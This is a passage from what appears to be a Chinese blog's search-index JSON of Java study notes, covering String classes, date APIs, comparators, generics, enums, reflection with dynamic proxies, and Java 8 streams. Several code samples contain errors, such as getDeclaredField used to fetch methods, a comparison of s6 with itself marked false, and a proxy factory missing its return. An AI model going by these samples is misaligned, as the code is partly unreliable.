局部内部类（方法内、代码块内、构造器内）\n\n","categories":["Java基础"],"tags":["面向对象"]},{"title":"Java基础（五）：常用类","url":"/2023/02/01/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E7%B1%BB/","content":"字符串相关的类String类\nString是一个final类，不可被继承，代表不可变的字符序列。\n\n字符串是常量，用双引号引起来表示，它们的值在创建之后不能修改。\n\nString实现了Serializable接口：表示字符串是支持序列化的。\n\nString实现了Comparable接口：表示字符串可以比较大小。\n\nString内部定义了final char[] value用于存储字符串数据。\n\nString：代表不可变的字符序列，简称”不可变性“。\n​    体现：\n\n当对字符串重新赋值时，需要重新指定内存区域赋值，不能使用原有的value进行赋值\n当对现有的字符串进行连接操作时，也需要重新指定内存区域赋值，不能使用原有的value进行赋值\n当调用String的replace()方法修改指定字符或字符串时，也需要重新指定内存区域赋值，不能使用原有的value进行赋值\n\nString s1 = &quot;abc&quot;;//字面量的定义方式String s2 = &quot;abc&quot;;System.out.println(s1==s2) //true，比较s1和s2的地址值，s1、s2指向同一个地址s1 = &quot;hello&quot;;System.out.println(s1); //helloSystem.out.println(s2); //abc\n\nString s3 = &quot;abc&quot;;s3 += &quot;def&quot;;System.out.println(s3); //abcdefSystem.out.println(s2); //abc\n\nString s4 = &quot;abc&quot;;String s5 = s4.replace(&#x27;a&#x27;,&#x27;m&#x27;)System.out.println(s4); //abcSystem.out.println(s5); //mbc\n\n\n\n通过字面量的方式（区别于new）给一个字符串赋值，此时的字符串值声明在字符串常量池中。\n\n字符串常量池中是不会存储相同内容的字符串的。\n\n\nString实例化方式\n通过字面量定义的方式\n通过new+构造器的方式\n\n面试题\nString str1 &#x3D; “abc” 与 String str2 &#x3D; new String(“abc”)的区别？\n//通过字面量定义的方式：此时的s1和s2的数据javaEE声明在方法区中的字符串常量池中。String s1 = &quot;javaEE&quot;;String s2 = &quot;javaEE&quot;;//通过new+构造器的方式：此时的s3和s4保存的地址值，时数据在堆空间中开辟空间以后对应的地址值。String s3 = new String(&quot;javaEE&quot;);String s4 = new String(&quot;javaEE&quot;);System.out.println(s1==s2); //trueSystem.out.println(s1==s3); //falseSystem.out.println(s1==s4); //falseSystem.out.println(s3==s4); //false\n\n\n\nPerson p1 = new Person(&quot;Tom&quot;,12);Person p2 = new Person(&quot;Tom&quot;,12);System.out.println(p1.name.equals(p2.name));//true,==重写了equalsSystem.out.println(p1.name == p2.name);//truep1.name = &quot;Jerry&quot;;System.out.println(p2.name);//Tom\n\n\n\nString s &#x3D; new String(“abc”)；方式创建对象，在内存中创建了几个对象？\n答：两个。一个时对空间中new的结构，另一个时char[]对应的常量池中的数据：”abc”\n\n\n不同拼接操作的对比String s1 = &quot;javaEE&quot;;String s2 = &quot;hadoop&quot;;String s3 = &quot;javaEEhadoop&quot;;String s4 = &quot;javaEE&quot;+&quot;hadoop&quot;;String s5 = s1+&quot;hadoop&quot;;String s6 = &quot;javaEE&quot;+s2;String s7 = s1+s2;System.out.println(s3 == s4); // trueSystem.out.println(s3 == s5); // flaseSystem.out.println(s3 == s6); // flaseSystem.out.println(s3 == s7); // flaseSystem.out.println(s5 == s6); // flaseSystem.out.println(s5 == s7); // flaseSystem.out.println(s6 == s6); // flaseString s8 = s5.intern();System.out.println(s3 == s8); // true，返回值得到的s8使用的常量中已经存在的&quot;javaEEhadoop&quot;\n\n\n常量与常量的拼接结果在常量池。\n只要其中有一个是变量，结果就在堆中。（与new类似）\n如果要拼接的结果调用intern()方法，返回值就在常量池中。\n\n\nString的常用方法\nint length():返回字符串长度\nchar chatAt(int index):返回某索引处的字符\nboolean isEmpty():判断是否是空字符串\nString toLowerCase():将所有字符转换为小写，原字符串不变，返回新的字符串\nString toUpperCase():将所有字符转换为大写，原字符串不变，返回新的字符串\nString trim():返回字符串的副本，忽略前导空白和尾部空白\nboolean equals(Object obj):比较字符串的内容是否相同\nboolean equalsIgnoreCase(String anotherString):忽略大小写的情况下比较字符串的内容是否相同\nString concat(String str):将指定字符串连接到此字符串的结尾，等价与于用”+”\nint compareTo(String anotherString):比较两个字符串的大小（涉及到字符串排序）\nString substring(int beginIndex):返回一个新的字符串，它是原字符串的子串\nString substring(int beginIndex,int endIndex):返回一个新的字符串，它是原字符串的子串\nboolean endsWith(String suffix):测试此字符串是否以指定的后缀结束\nboolean startsWith(String prefix):测试此字符串是否以指定的前缀开始\nboolean startsWith(String prefix,int toffset):测试此字符串从指定索引下标开始的子字符串是否以指定的前缀开始\nboolean contains(CharSeqence s):当前仅当此字符串包含指定的char值序列时，返回true\nint indexOf(String str):返回指定子字符串在此字符串中第一次出现处的索引\nint indexOf(String str,int fromIndex):返回从指定索引开始的指定子字符串在此字符串中第一次出现处的索引\nint lastIndexOf(String str):返回指定子字符串在此字符串中最后一次出现处的索引\nint lastIndexOf(String str,int fromIndex)从指定索引反向操作，返回指定子字符串在此字符串中最后一次出现处的索引\nint indexOf(String str):返回指定子字符串在此字符串中第一次出现处的索引\n替换:\nString repalce(char oldChar,char newChar)\nString repalce(CharSequence target,CharSequence replacement)\nString repalceAll(String regex,String replacement)\nString repalceFirst(String regex,String replacement)\n\n\n匹配：\nboolean matches(String regex)\n\n\n切片：\nString[] split(String regex)\nString[] split(String regex,int limit)\n\n\n\nString类与其他结构之间的转换String与基本数据类型、包装类之间的转换\nString —&gt; 基本数据类型、包装类：调用包装类的静态方法：parseXxx(str)\n\nString str = &quot;123&quot;;  //在常量池里int num = Integer.parseInt(str1);\n\n\n基本数据类型、包装类 —&gt; String  ：调用String重载的valueOf(xxx)\n\nint num = 123;String str1 = String.valueOf(num);String str2 = num + &quot;&quot;;   //在堆里System.out.println(str==str2) //false\n\nString与char[]之间的转换\nString —&gt; char[]：调用String的toCharArray()\n\nString str = &quot;abc123&quot;;  //在常量池里char[] charArray = str.toCharArray();\n\n\nchar[] —&gt; String  ：调用String的构造器\n\nchar[] arr = new char[]&#123;&#x27;h&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;&#125;;String str = new String(arr);\n\nString与byte[]之间的转换\nString —&gt; byte[]：调用String的getBytes()\n\nString str = &quot;abc123&quot;; byte[] bytes = str.getBytes();//使用默认的字符集进行编码//byte[] bytes = str.getBytes(&quot;gbk&quot;);//使用gbk字符集进行编码System.out.println(Array.toString(bytes)); //[97,98,99,49,50,51]\n\n\nchar[] —&gt; String  ：调用String的构造器\n\nString str = new String(byte);//使用默认的字符集进行解码String str = new String(byte,&quot;gbk&quot;);//使用gbk字符集进行解码\n\nStringBuffer 和 StringBuilder\nString、String Buffer、StringBuilder三者的异同？\n\nString：不可变的字符序列；底层使用char[]存储\nStringBuffer：可变的字符序列；线程安全的，效率低；（多线程问题时选择）；底层使用char[]存储\nStringBuilder：可变的字符序列；jdk5.0新增的，线程不安全的，效率高；（单线程问题时选择）；底层使用char[]存储\n三者效率从高到低：StringBuilder &gt; StringBuffer &gt; String\n\n\n源码分析：\nString str = new String();//new char[0];String str1 = new String(&quot;abc&quot;);//new char[]&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;&#125;;StringBuufer sb1 = new StringBuffer();//new char[16]; 底层创建了一个长度是16的数组sb1.append(&#x27;a&#x27;);//value[0]=&#x27;a&#x27;;sb1.append(&#x27;b&#x27;);//value[1]=&#x27;b&#x27;;StringBuufer sb2 = new StringBuffer(&quot;abc&quot;);//new char[&quot;abc&quot;.length()+16]; \n\n\n扩容问题：如果要添加的数据底层数组盛不下了，那就需要扩容底层的数组。默认情况下，扩容为原来容量的2倍+2，同时将原有数组中的元素复制到新的数组中。\n\n\n\nStringBuffer类的常用方法\nStringBuffer append(xxx)\nStringBuffer delete(int start,int end)\nStringBuffer replace(int start,int end,String str)\nStringBuffer insert(int offset,xxx)\nStringBuffer reverse()\n\n日期时间相关APISystem类中的currentTimeMillis()返回当前时间与1970年1月1日0分0秒之间以毫秒为单位的时间差，称为时间戳。适用于计算时间差\nlong time = System.currentTimeMillis();System.out.println(time);\n\nDate类（两个）\njava.util.Date类（父类）\n两个构造器的使用\n//构造器一：Date()创建一个当前时间的Date对象Date date1 = new Date();Sytem.out.println(date1.toString());Sytem.out.println(date1.getTime());//构造器二：创建指定毫秒数的Date对象Date date2 = new Date(1550306204104L);\n\n两个方法的使用\n\ntoString()：显式当前的年月日时分秒\ngetTime()：获取当前Date对象的时间戳\n\n\n\n\njava.sql.Date类（子类）对应数据库中的日期类型的变量\njava.sql.Date Date3 = new java.sql.Date(1550306204104L);Sytem.out.println(date3.toString());//1971-02-13\n\n如何将java.util.Date对象转换为java.sql.Date对象\nDate date1 = new Date();java.sql.Date date2 = new java.sql.Date(date2.getTime());\n\nSimpleDateFormat类java.text.SimpleDateFormat类\nSimpleDateFormat对日期Date类的格式化和解析\n\n格式化：日期—-&gt;字符串\nSimpleDateFormat sdf = new SimpleDateFormat();//SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm:ss&quot;);Date date = new Date();String format = sdf.formate(date);Sytem.out.println(format);//19-2-18 上午11:43\n\n解析：字符串—-&gt;日期\nString str = &quot;19-2-18 上午11:43&quot;;Date date1 = sdf.parse(str);\n\nCalendar类抽象类，不能直接实例化\n//方式一：创建其子类（GregorianCalendar）的对象//方式二：调用其静态方法getInstance()Calendar calendar = Calendar.getInstance();//常用方法int days = calendar.get(Calendar.DAY_OF_MONTH);calendar.set(Calendar.DAY_OF_MONTH,22);calendar.add(Calendar.DAY_OF_MONTH,3);Date date = calendar.getTime();calendar.setTime(date)\n\nLocalDate、LocalTime、LocalDateTime的使用体现了不可变性\nLocalDate localDate = LocalDate.now();LocalTime localTime = LocalTime.now();LocalDateTime localDateTime = LocalDateTime.now();\n\nInstant类时间线上的一个瞬时点\nDateTimeFormatter类java比较器Comparable接口（自然排序）\nString、包装类等实现了Comparable接口，重写了compareTo()方法，给出了比较两个二对象大小的方式，进行从小到大排列。\n\n重写compareTo(obj)的规则：\n\n如果当前对象this大于形参对象obj，则返回正整数\n如果当前对象this小于形参对象obj，则返回负整数\n如果当前对象this等于形参对象obj，则返回零\n\n\n对于自定义类来说，如果需要排序，可以让自定义类实现Comparable接口，重写compareTo(obj)方法。\npublic class Goods implepments Comparable&#123;    private String name;    private double price;       //指明商品比较大小的方式：按照价格从低到高排序,再按照产品名称从高到低排序    @Override    public int compareTo(Object o)&#123;        if(o instanceof Goods)&#123;            Goods goods = (Goods)o;            //方式一：            if(this.price &gt; goods.price)&#123;                return 1;            &#125;else if(this.price &lt; goods.price)&#123;                return -1;            &#125;else&#123;                //return 0;                return -this.name.compareTo(goods.name);            &#125;            //方式二：//          return Double.compare(this.price,goods.price);        &#125;        throw new RuntimeException(&quot;传入的数据类型不一致！&quot;);    &#125;&#125;@Testpublic void test()&#123;    Goods[] arr = new Goods[4];    arr[0] = new Goods(&quot;lenovoMouse&quot;,34);    arr[1] = new Goods(&quot;dellMouse&quot;,43);    arr[2] = new Goods(&quot;xiaomioMouse&quot;,12);    arr[3] = new Goods(&quot;hauweiMouse&quot;,65);        Arrays.sort(arr);        System.out.println(Arrays.toString(arr));&#125;\n\nComparator接口（定制排序）\n背景：当元素的类型没有实现Comparable接口而又不方便修改代码，或者实现了Comparable接口的排序规则不适合当前的操作，那么可以考虑使用Comparator的对象来排序。、\n\n\n重写compare(Object o1,Object o2)方法的规则：\n\n如果返回正整数，o1大于o2;\n如果返回负整数，o1小于o2；\n如果返回0，表示相等。\n\n@Testpublic void test()&#123;    String[] arr = new String[]&#123;&quot;AA&quot;,&quot;CC&quot;,&quot;KK&quot;,&quot;MM&quot;,&quot;GG&quot;,&quot;JJ&quot;,&quot;DD&quot;&#125;;    Arrays.sort(arr,new Comarator()&#123;        @Override        public int compare(Object o1,Object o2)&#123;            if(o1 instanceof String &amp;&amp; o2  instanceof String)&#123;                String s1 = (String)o1;                String s2 = (String)o2;                //从大到小                return -s1.compareTo(s2);            &#125;            throw new RuntimeException(&quot;传入的数据类型不一致！&quot;);        &#125;    &#125;);    System.out.println(Arrays.toString(arr));&#125;\n\n@Testpublic void test()&#123;    Goods[] arr = new Goods[4];    arr[0] = new Goods(&quot;lenovoMouse&quot;,34);    arr[1] = new Goods(&quot;dellMouse&quot;,43);    arr[2] = new Goods(&quot;xiaomioMouse&quot;,12);    arr[3] = new Goods(&quot;hauweiMouse&quot;,65);        Arrays.sort(arr,new Comparator()&#123;        //指明商品比较大小的方式：按照产品名称从低到高排序,再按照价格从高到低排序        @Override        public int compare(Object o1,Object o2)&#123;            if(o1 instanceof Goods &amp;&amp; o2  instanceof Goods)&#123;                Goods g1 = (Goods)o1;                Goods g2 = (Goods)o2;                if(g1.getName().equals(g2.getName()))&#123;                    return -Double.compare(g1.getPrice(),g2.getPrice());                &#125;else&#123;                    return g1.getName().compareTo(g2.getName());                &#125;            &#125;            throw new RuntimeException(&quot;传入的数据类型不一致！&quot;);        &#125;    &#125;);        System.out.println(Arrays.toString(arr));&#125;\n\nComparable接口与Comparator接口对比：\n\nComparable接口的方式一旦指定，保证该接口实现类的对象在任何位置都可以比较大小\nComparator接口属于临时性的比较。\n\n\n\n","categories":["Java基础"],"tags":["常用类"]},{"title":"Java基础（八）：泛型","url":"/2023/02/04/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E5%85%AB%EF%BC%89%EF%BC%9A%E6%B3%9B%E5%9E%8B/","content":"泛型的概念\n泛型：就是允许在定义类、接口时通过一个标识表示类中某个属性的类型或者是某个方法的返回值及参数类型。这个类型参数将在使用时（例如，继承或实现这个接口，用这个类型声明变量、创建对象时）确定（即传入实际的类型参数，也成为类型实参）\n\n在集合中使用泛型举例：以ArrayList为例\nArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;();list.add(87);list.add(37);list.add(12);//编译时，就会进行类型检测，保证数据的安全//list.add(&quot;Tom&quot;);//会报错for(Integer score:list)&#123;    //避免了强转操作    int stuScore = score;    System.out.println(stuScore);&#125;Iterator&lt;Integer&gt; iterator = list.iterator();while(iterator.hasNext())&#123;    //避免了强转操作    int stuScore = iterator.next();    System.out.println(stuScore);&#125;\n\n在集合中使用泛型举例：以HashMap为例\n//jdk7新特性：类型推断，后面的泛型可以省略Map&lt;String,Integer&gt; map= new HashMap&lt;&gt;();map.put(&quot;Tom&quot;,87);map.put(&quot;Jerry&quot;,87);map.put(&quot;Jack&quot;,67);//泛型的嵌套Set&lt;Map.Entry&lt;String,Integer&gt;&gt; entry = map.entrySet();Iterator&lt;Map.Entry&lt;String,Integer&gt;&gt; iterator = entry.iterator();while(iterator.hasNext())&#123;    Map.Entry&lt;String,Integer&gt; e = iterator.next();    String key = e.getKey();    Integer value = e.getValue();    System.out.println(key + &quot;----&quot; + value);&#125;\n\n泛型的类型必须是类，不能是基本数据。需要用到基本数据类型时，拿包装类替换\n\n如果实例化时没有指定范型的类型，默认类型为java.lang.Object类\n\n\n自定义泛型类结构\n自定义泛型结构：泛型类、泛型接口、泛型方法\n泛型类、泛型接口public class Order&lt;T&gt;&#123;    String orderName;    int orderId;        T orderT;        public Order()&#123;&#125;;        public Order(String orderName,int orderId,T this.orderT = orderT;)&#123;        this.orderName = orderName;        this.orderId = orderId;        this.orderT = orderT;    &#125;    //如下的方法都不是泛型方法    public T getOrderT()&#123;        return orderT;    &#125;    public void setOrderT(T orderT)&#123;        this.orderT = orderT;    &#125;&#125;\n\n\n泛型类可能有多个参数，此时应将多个参数一起放在尖括号内：&lt;E1,E2,E3&gt;\n静态方法中不能使用类的泛型：泛型要在实例化是时候确定，而静态方法在构造类的时候就要确定了\n异常类不能声明为泛型类\n泛型声明数组：\n\n//这样写报错T[] arr = new T[10];//这样写正确T[] arr = (T[])new Object[10];\n\n泛型方法\n泛型方法：在方法中出现了泛型的结构，泛型参数与类的泛型参数没有任何关系。换句话说，泛型方法所属的类是不是泛型类没有关系。\n\n//第一个E是告诉编译器E是泛型而不是一个类的名字public &lt;E&gt; List&lt;E&gt; copyFromArrayToList(E[] arr)&#123;    ArrayList&lt;E&gt; list = new ArrayList&lt;&gt;();        for(E e:arr)&#123;        list.add(e);    &#125;    return list;&#125;\n\n\n静态方法可以是泛型方法：泛型参数是在调用方法时确定的，并非在实例化时确定。\n\n\n\n泛型在继承方面的体现Object obj = null;String str = null;obj = str;Object[] arr1 = null;String[] arr2 = null;arr1 = arr2;List&lt;Object&gt; list1 = null;List&lt;String&gt; list2 = null;//此时的list1和list2的类型不具有子父类关系list1 = list2;\n\n\n虽然类A是类B的父类，但是G和G二者不具备子父类关系，二者是并列关系。\n反证法：假设list1&#x3D;list2; list1.add(123)；导致混入非String的数据，出错。\n\n补充：类A是类B的父类，A是B的父类。\n\n\n通配符的使用\n通配符：？\nList&lt;Object&gt; list1 = null;List&lt;String&gt; list2 = null;//list相当于公共父类List&lt;?&gt; list = null;list = list1;list = list2;print(list1);print(list2);public void print(List&lt;?&gt; list)&#123;    Iterator&lt;?&gt; iterator = list.iterator();    while(iterator.hasNext())&#123;        Object obj  = iterator.next();        System.out,println(obj)    &#125;&#125;\n\nG和G二者没有关系，二者共同的父类是G&lt;?&gt;\n\n使用通配符后写入和读取操作：\nList&lt;String&gt; list3 = new ArrayList&lt;&gt;();list3.add(&quot;AA&quot;);list3.add(&quot;BB&quot;);list3.add(&quot;CC&quot;);//添加（写入）：对于List&lt;?&gt;就不能向其内部添加数据//除了添加null之外list = list3;//list.add(&quot;DD&quot;) //报错//获取（读取）：允许读取数据，读取的数据类型为ObjectObject o = list.get(0);\n\n有限制条件的通配符的使用\n\n？：(-∞，+∞)\n? extends A：(-∞，A]   小于等于\n? super A：[A，+∞)    大于等于\n\nList&lt;? extends Person&gt; list1 = null;List&lt;? super Person&gt; list2 = null;List&lt;Student&gt; list3 = null;List&lt;Person&gt; list4 = null;List&lt;Object&gt; list5 = null;list1 = list3;list1 = list4;//list1 = list5; //报错//list2 = list3; // 报错list2 = list4;list2 = list5;\n\n","categories":["Java基础"],"tags":["泛型"]},{"title":"Java基础（六）：枚举类","url":"/2023/02/02/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9A%E6%9E%9A%E4%B8%BE%E7%B1%BB/","content":"枚举类的使用\n理解：类的对象只有有限个，确定的。称此类为枚举类\n当需要定义一组常量时，强烈建议使用枚举类\n如果枚举类中只有一个对象，则可以作为单例模式的实现方式。\n\n如何定义枚举类\n方式一：jdk5.0之前，自定义枚举类\nclass Season&#123;    //1.声明Season对象的属性：private final 修饰    privare final String seasonName;    private final String seasonDesc;        //2. 私有化类的构造器,并给对象属性赋值    private Season(String seasonName,String seasonDesc)&#123;        this.seasonName = seasonName;        this.seasonDesc = seasonDesc;    &#125;        //3.提供当前枚举类的多个对象：声明为public static final    public static final Season SPRING = new Season(&quot;春天&quot;,&quot;春暖花开&quot;);    public static final Season SUMMER = new Season(&quot;春天&quot;,&quot;夏日炎炎&quot;);    public static final Season AUTUMN = new Season(&quot;春天&quot;,&quot;秋高气爽&quot;);    public static final Season WINTER = new Season(&quot;春天&quot;,&quot;冰天雪地&quot;);&#125;\n\n方式二：jdk5.0，可使用enum关键字定义枚举类\n定义的枚举类默认继承于java.lang.Enum\nenum Season&#123;    //1.提供当前枚举类的多个对象：多个对象之间用&quot;,&quot;隔开，末尾对象&quot;;&quot;结束    SPRING(&quot;春天&quot;,&quot;春暖花开&quot;),    SUMMER(&quot;春天&quot;,&quot;夏日炎炎&quot;),    AUTUMN(&quot;春天&quot;,&quot;秋高气爽&quot;),    WINTER(&quot;春天&quot;,&quot;冰天雪地&quot;);    //2.声明Season对象的属性：private final 修饰    privare final String seasonName;    private final String seasonDesc;        //2. 私有化类的构造器,并给对象属性赋值    private Season(String seasonName,String seasonDesc)&#123;        this.seasonName = seasonName;        this.seasonDesc = seasonDesc;    &#125;&#125;\n\nEnum类中常用方法\nvalus()：返回枚举类型的对象数组，该方法可以很方便地遍历所有的枚举值。\nvaluOf(String str)：可以把一个字符串转为对应的枚举类对象。要求字符串必须是枚举类对象。\ntoString：返回当前枚举类对象常量的名称。\n\n","categories":["Java基础"],"tags":["枚举类"]},{"title":"Java基础（十一）：反射机制","url":"/2023/02/06/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89%EF%BC%9A%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/","content":"反射的概述\nReflection（反射）是被视为动态语言（运行时代码可以根据某些条件改变自身结构）的关键，反射机制允许程序在执行期借助Reflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。\n\n正常方式：引入需要的“包类”名称 —-&gt; 通过new实例化 —-&gt; 取得实例化对象\n\n反射方式：实例化对象 —-&gt; getClass()方法 —-&gt; 得到完整的”包类”名称\n对象就像一面镜子，通过这个镜子看到类的结构，所以形象的称之为：反射\n\n反射机制提供的功能：\n\n在运行时判断任意一个对象所属的类\n在运行时构造任意一个类的对象\n在运行时判断任意一个类所具有的成员变量和方法\n在运行时获取泛型信息\n在运行时调用任意一个对象的成员变量和方法\n在运行时处理注释\n生成动态代理\n\n\n\n反射之前//1.创建Person类的对象Person p1 = new Person(&quot;Tom&quot;,12);//2.通过对象，调用其内部的属性、方法//调用属性p1.age = 10;System.out.println(p1.toString());//调用方法p1.show();//在Person类外部，不可以通过Person类的对象调用其内部私有结构。//比如：name、showNation()以及私有的构造器\n\n使用反射Class clazz = Person.class;//1.通过反射，创建Person类的对象Constructor cons = clazz.getConstructor(String.class,int.class);Object obj = cons.newInstance(&quot;Tom&quot;,12);Person p = (Person)obj;//2.通过反射，调用对象指定的属性、方法Field age = clazz.getDeclaredField(&quot;age&quot;);age.set(p,10);System.out.println(p.toString());Method show = clazz.getDeclaredField(&quot;show&quot;);show.invoke(p);//3.通过反射，可以调用Person类的私有结构，比如：私有构造器、方法、属性//调用私有构造器Constructor cons1 = clazz.getConstructor(String.class);cons1.setAccessible(true);Person p1 = (Person)cons1.newInstance(&quot;Jerry&quot;);//调用私有属性Field name = clazz.getDeclaredField(&quot;name&quot;);name.setAccessible(true);//保证当前属性可访问name.set(p1,&quot;HanMeimei&quot;);System.out.println(p1.toString());//调用私有方法Method showNation = clazz.getDeclaredField(&quot;showNation&quot;,String.class);showNation.setAccessible(true);String nation = (String)showNation.invoke(p1,&quot;中国&quot;);//invoke()的返回值即为对应类中调用的方法的返回值。//调用静态方法 private static void showDesc()Method showDesc = clazz.getDeclaredField(&quot;showDesc&quot;);showDesc.setAccessible(true);Object returnVal = showDesc.invoke(Person.class);//返回null\n\n反射和封装的关系\n直接new的方式或反射的凡是都可以调用公共的结构，实际开发中用哪个？\n答：建议直接new的方式？\n\n什么时候会使用反射的方式？\n答：反射的特征：动态性（与用户的交互有关）。编译时还不能确定new哪个类的对象时，使用反射。例如：用户登录或注册操作，点击登录new login对象，点击注册new register对象。\n\n反射机制与面向对象中的封装性是不是矛盾的？如何看待两个技术？\n答：不矛盾。封装性体现的是建议能不能调用的问题，反射体现的是能不能调的问题。\n\n\nClass类关于java.Lang.Class类的理解\n\n类的加载过程\n程序经过javac.exe命令以后，会生成一个或多个字节码文件（以.class结尾）。\n接着我们使用java.exe命令对某个字节码文件进行解释运行。相当于将某个字节码文件加载到内存中，此过程就称为类的加载。加载到内存中的类，称作为运行时类，此运行时类，就作为Class的一个实例。（运行类本身是Class类的对象）\n\n\n换句话说，Class的实例就对应着一个运行时类。\n加载到内存中的运行时类，会缓存一定的时间。在此时间之内，可以通过不同的方式来获取此运行时类。\n\n获取Class实例的4中方式\n方式一：调用运行时类的属性.class\nClass&lt;Person&gt; clazz1 = Person.class;\n\n方式二：通过运行时类的对象，调用getClass()\nPerson p1 = new Person();Class clazz2 = p1.getClass();\n\n方式三：调用CLass的静态方法forName(String classPath)【用得最多】\nClass clazz3 = Class.forName(&quot;com.atguigu.java.Person&quot;);\n\n方式四：使用类的加载器ClassLoader【了解】\nClassLoader classLoader = ReflectionTest.class.getClassLoader();Class clazz4 = classLoader.loadClass(&quot;com.atguigu.java.Person&quot;);\n\nSystem.out.println(clazz1 == clazz2);   //trueSystem.out.println(clazz1 == clazz3);   //trueSystem.out.println(clazz1 == clazz4);   //true\n\n哪一些类型可以有Class对象\nclass\ninterface\n[]：数组\nenum\nannotation：注解\nprimitive type：基本数据类型\nvoid\n\n加载器ClassLoader\n对于自定义类，使用系统类加载器进行加载\nClassLoader classLoader = ClassLoaderTest.class.getClassLoader();\n\n调用系统类加载器的getParent()：获取扩展类加载器\nClassLoader classLoader1 = classLoader.getParent();\n\n调用扩展类加载器的getParent()：无法获取引导类加载器\n引导类加载器主要负责加载java类的核心类库，无法加载自定义类\n\n\n使用ClassLoader加载配置文件Properties pros = new Properties();//读取配置文件的方式一：//配置文件默认识别为：当前module下//FileInputStream fis = new FileInputStream(&quot;jdbc.properties&quot;);//pros.load(fis);//方式二：//配置文件默认识别为：当前module的src下ClassLoader classLoader = ClassLoaderTest.class.getClassLoader();InputStream is = classLoader.getResourceAsStream(&quot;jdbc.properties&quot;);pros.load(is);String user = pros.getProperty(&quot;user&quot;);String password =pros.getProperty(&quot;password&quot;);\n\n创建运行时类的对象\n通过反射创建对应的运行时类的对象\nClass&lt;Person&gt; clazz = Person.class;//newInstance()：调用此方法，创建对应的运行时类的对象。内部调用了运行时类的空参的构造器Person obj = clazz.newInstance();\n\n要想此方法正常的创建运行时类的对象，要求：\n\n运行时类必须提供空参的构造器\n空参的构造器的访问权限得够。通常设置为public\n\n在javabean中要求提供一个public的空参构造器，原因：\n\n便于通过反射，创建运行时类的都西昂\n便于子类继承此运行时类时，默认调用super()时，保证父类有此构造器\n\n\n\n反射的应用：动态代理\n代理设计模式的原理：使用一个代理将对象包装起来，用该代理对象取代原始对象。任何对原始对象的调用都要通过代理，代理对象决定是否以及何时将方法调用到原始对象上。\n\n静态代理：代理类和目标对象的类都是在编译期间确定下来，不利于程序的扩展。同时，每个代理类只能为一个接口服务，这样一来程序开发中必然产生过多的代理。\n特点：代理类和被代理类在编译期间就确定了。\n//被代理类class ProxyClothFactory implements ClothFactory&#123;    private ClothFactory factory; //用被代理对象进行实例化    public ProxyClothFactory(ClothFactory factory)&#123;        this.factory = factory;    &#125;    @Override    public void produceCloth()&#123;        System.out.println(&quot;代理工厂做一些准备工作&quot;);        factory.produceCloth();        System.out.println(&quot;代理工厂做一些后续收尾工作&quot;);                &#125;&#125;//被代理类class NikeClothFactory implements ClothFactory&#123;    @Override    public void produceCloth()&#123;        System.out.println(&quot;Nike工厂生产一批运动服&quot;);           &#125;&#125;//创建被代理类的对象NikeClothFactory nike = new NikeClothFactory();//创建代理类的对象ProxyClothFactory proxy = new ProxyClothFactory(nike);ProxyClothFactory.produceCloth();\n\n动态代理：指客户通过代理类来调用其它对象的方法，并且时在程序运行时根据需要动态创建目标类的代理对象。\nclass SuperMan implements Human&#123;    @Override    public String getBelief()&#123;        return &quot;I believe I can fly!&quot;;    &#125;    @Override    public void est(String food)&#123;        System.out.println(&quot;我喜欢吃&quot;+food);        &#125;&#125;class ProxyFactory&#123;    public static Object getProxyInstance(Object obj)&#123;//obj:被代理类的对象         \t\tMyInvocationHandler handler = new MyInvocationHandler();        handler.bind(obj);        Proxy.newProxyInstance(obj.getClass().getClassLoader(),obj.getClass().getInterfaces(),handler);    &#125;&#125;class MyInvocationHandler implements InvocationHandler&#123;    private Object obj;//需要使用被代理类对象进行赋值        public void bind(Object obj)&#123;        this.obj = obj;    &#125;    //当我们通过代理类的对象，调用方法a时，就会自动调用如下的方法：invoke()    //将被代理类要执行的方法a的功能就声明在invoke()中    @Override    public Object invoke(Object proxy,Method method,Object[] args) throws Throwable&#123;        //method:即为代理类独享调用的方法，此方法也作为了被代理类对象要调用的方法        Object returnValue = method.invoke(obj,args);        return returnValue;    &#125;&#125;//测试SuperMan superMan = new SuperMan();Human proxyInstance = (Human)ProxyFactory.getProxyInstance(superMan);String belief = proxyInstance.getBelief();proxyInstance.eat(&quot;四川麻辣烫&quot;);---------------------------------------------------NikeClothFactory nikeClothFactory = new NikeClothFactory();ClothFactory proxyClothFactory = (ClothFactory)ProxyFactory.getProxyInstance(nikeClothFactory);proxyClothFactory.produceCloth();\n\n","categories":["Java基础"],"tags":["反射机制"]},{"title":"Java基础（十二）：新特性","url":"/2023/02/06/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%96%B0%E7%89%B9%E6%80%A7/","content":"Java8新特性Lambda表达式\n举例：(o1,o2) -&gt; Integer.compare(o1,o2);\n格式：\n-&gt;：lambda操作符 或 箭头操作符\n-&gt;左边：lambda形参列表（其实就是接口中的抽象方法的形参列表）\n-&gt;右边：lambda体（其实就是重写的抽象方法的方法体）\n\n\nLambda表达式的本质：作为函数式接口的实例\n函数式接口：如果一个接口中只声明了一个抽象方法，则此接口就称为函数式接口（@FunctionalInterface）\n\nStream API\n使用Stream API可以对集合数据进行操作，类似于使用SQL执行的数据库查询\nStream不存储元素\nStream不改变源对象，会返回一个持有结果的新Stream\nStream操作时延迟执行的，意味着等到需要结果的时候才执行\nStream的操作三个步骤\n创建Stream\n中间操作：操作链\n终止操作：一旦执行终止操作，就执行中间操作链，并产生结果，之后不会再被使用\n\n\n\n创建Stream\n方式一：通过集合\nList&lt;Employee&gt; employees = EmployeeData.getEmployees();//defalut Stream&lt;E&gt; stream():返回一个顺序流Stream&lt;Employee&gt; stream = employees.stream();//defalut Stream&lt;E&gt; parallelStream():返回一个并行流Stream&lt;Employee&gt; parallelStream = employees.parallelStream();\n\n方式二：通过数组\nint[] arr = new 